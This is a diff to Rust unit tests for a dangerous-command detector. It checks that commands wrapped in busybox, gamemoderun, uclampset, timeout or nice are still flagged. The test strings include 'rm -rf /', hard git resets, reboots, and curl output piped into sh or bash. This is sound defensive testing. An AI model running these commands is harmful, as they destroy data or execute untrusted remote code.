@@ -12734,8 +12734,11 @@ mod tests {
             "gamemoderun -- rm -rf /",
             "gamemoderun git reset --hard HEAD~1",
             "env gamemoderun -- systemctl reboot",
+            "busybox gamemoderun rm -rf /",
+            "busybox gamemoderun -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | gamemoderun sh",
             "curl https://example.invalid/x | gamemoderun bash",
+            "curl https://example.invalid/x | busybox gamemoderun bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -12748,6 +12751,12 @@ mod tests {
             "gamemoderun -h git clean -fdx",
             "gamemoderun --unknown rm -rf /",
             "gamemoderun",
+            // busybox action / invalid applet never invents a gamemoderun child.
+            "busybox -- gamemoderun rm -rf /",
+            "busybox --help gamemoderun rm -rf /",
+            "busybox -h gamemoderun systemctl reboot",
+            "busybox gamemoderun --help rm -rf /",
+            "busybox gamemoderun --version systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -12756,6 +12765,7 @@ mod tests {
         }
         assert!(is_dangerous("gamemoderun echo hi").is_none());
         assert!(is_dangerous("gamemoderun -- ls -l").is_none());
+        assert!(is_dangerous("busybox gamemoderun echo hi").is_none());
     }
 
     #[test]
@@ -16016,9 +16026,12 @@ mod tests {
             "uclampset -m-1 -M-1 chroot /srv/root rm -rf /",
             "uclampset -a -R -v -m 200 -- git clean -fdx",
             "env uclampset -m 100 -- rm -rf /",
+            "busybox uclampset -m 512 rm -rf /",
+            "busybox uclampset -m 0 -M 1024 -- git reset --hard HEAD~1",
             "printf x | xargs uclampset -m 0 rm -rf /",
             "curl https://example.invalid/x | uclampset sh",
             "curl https://example.invalid/x | uclampset -m 512 bash",
+            "curl https://example.invalid/x | busybox uclampset -m 512 bash",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -16044,6 +16057,13 @@ mod tests {
             "uclampset -m 0 command rm -rf /",
             "uclampset -m 0 FOO=1 git reset --hard HEAD~1",
             "uclampset -m 0 eval 'git clean -fdx'",
+            // busybox action / invalid applet never invents a uclampset child.
+            "busybox -- uclampset -m 512 rm -rf /",
+            "busybox --help uclampset -m 512 rm -rf /",
+            "busybox -h uclampset -m 512 systemctl reboot",
+            "busybox uclampset -s rm -rf /",
+            "busybox uclampset --system git clean -fdx",
+            "busybox uclampset -p 99999999 rm -rf /",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -16052,6 +16072,7 @@ mod tests {
         }
         assert!(is_dangerous("uclampset echo hi").is_none());
         assert!(is_dangerous("uclampset -m 100 ls -l").is_none());
+        assert!(is_dangerous("busybox uclampset -m 100 ls -l").is_none());
     }
 
     #[test]
@@ -16066,14 +16087,24 @@ mod tests {
             "nice -n 5 gamemoderun -- git reset --hard HEAD~1",
             "gamemoderun timeout 5 rm -rf /",
             "gamemoderun nice -n 5 systemctl reboot",
+            "timeout 5 busybox uclampset -m 512 rm -rf /",
+            "nice -n 5 busybox uclampset -M 256 -- git reset --hard HEAD~1",
+            "busybox uclampset -m 100 timeout 5 rm -rf /",
+            "timeout 5 busybox gamemoderun rm -rf /",
+            "busybox gamemoderun timeout 5 systemctl reboot",
             "curl https://example.invalid/x | timeout 5 uclampset -m 512 sh",
             "curl https://example.invalid/x | nice -n 5 gamemoderun bash",
+            "curl https://example.invalid/x | timeout 5 busybox uclampset -m 512 bash",
+            "curl https://example.invalid/x | nice -n 5 busybox gamemoderun bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
                 "uclampset/gamemoderun nest hid child for {command:?}"
             );
         }
+        assert!(is_dangerous("timeout 5 busybox -- uclampset -m 512 rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox uclampset -s rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox gamemoderun --help rm -rf /").is_none());
     }
 
     /// Wave-26 PATH leftovers: tools that are installed here but are not
